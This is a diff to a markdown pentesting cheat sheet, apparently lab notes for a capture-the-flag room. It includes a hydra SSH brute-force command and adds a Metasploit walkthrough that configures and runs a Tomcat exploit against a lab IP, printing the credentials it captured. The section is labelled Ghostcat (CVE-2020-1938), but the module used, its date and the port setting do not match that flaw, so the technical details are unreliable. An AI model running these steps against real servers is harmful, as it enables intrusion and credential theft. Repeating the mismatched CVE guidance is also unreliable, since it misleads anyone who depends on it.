@@ -26,6 +26,68 @@ amass enum -d [Target Domain]    # Active enumeration
 hydra -l user_ name -P /home/iftx/Desktop/Room/wordlist/rockyou.txt 10.10.181.27 ssh
 
 ```
+
+## Metasploit
+
+<details>
+  <summary>
+   Metasploit Exploitation (Ghostcat - CVE-2020-1938)
+
+  </summary>
+
+1. Launch Metasploit
+
+ `msfconsole`
+
+2. Search for AJP Exploits
+
+   `msf6 > search ajp`
+   
+```
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/tomcat_jsp_upload_bypass  2020-02-24       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+```
+3. Select and Configure the Exploit
+
+   `msf6 > use 0 `
+   
+
+`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > show options`
+
+
+```
+Module options (exploit/multi/http/tomcat_jsp_upload_bypass):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s)
+   RPORT      8080             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path
+   VHOST                       no        HTTP server virtual host
+```
+
+
+`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOSTS 10.10.228.82`
+
+
+`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RPORT 8009`
+
+
+`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run`
+
+
+skyfuck:8730281lkjlkjdqlksalks
+
+
+  
+</details>
+
 ## Privilege Escalation
 
 <details>
